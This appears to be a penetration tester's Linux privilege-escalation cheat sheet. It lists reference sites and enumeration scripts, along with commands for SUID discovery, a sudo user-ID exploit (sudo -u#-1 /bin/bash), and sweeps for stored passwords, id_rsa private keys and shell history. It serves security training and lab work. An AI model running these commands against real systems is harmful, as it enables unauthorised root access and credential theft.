### Valuable links and sources
```
https://book.hacktricks.xyz/
https://book.hacktricks.xyz/linux-unix/privilege-escalation
https://gtfobins.github.io/
https://www.revshells.com/
https://ippsec.rocks/?#
https://github.com/Snoopy-Sec/Localroot-ALL-CVE
https://guif.re/linuxeop#Exploits%20worth%20running
```

### Usefull Scripts
```
linpeas.sh  #https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
les.sh      #https://github.com/mzet-/linux-exploit-suggester
LinEnum.sh  #https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
pspy        #https://github.com/DominicBreuker/pspy
```

### Overall System Info & Architecture
```
uname -a
cat /etc/issue
```

### Check for your sudo privileges
```
sudo -l
```
### Check if your sudo version is vulnerable
```
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]" #check
sudo -u#-1 /bin/bash                                                                         #exploit 
```

### Always check for hidden files
```
ls -la
```

### Find SUID files
```
find / -perm -u=s -type f 2>/dev/null
```

### Look for stored credentials & private keys
```
locate 'password' | more #will look for files named "password"
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find / -name id_rsa 2> /dev/null
```

### Find processes running with root privileges
```
ps aux
ps aux |grep root
```

### Check the history of previously used commands
```
history
cat ~/.zsh_history
cat ~/.bash_history
```


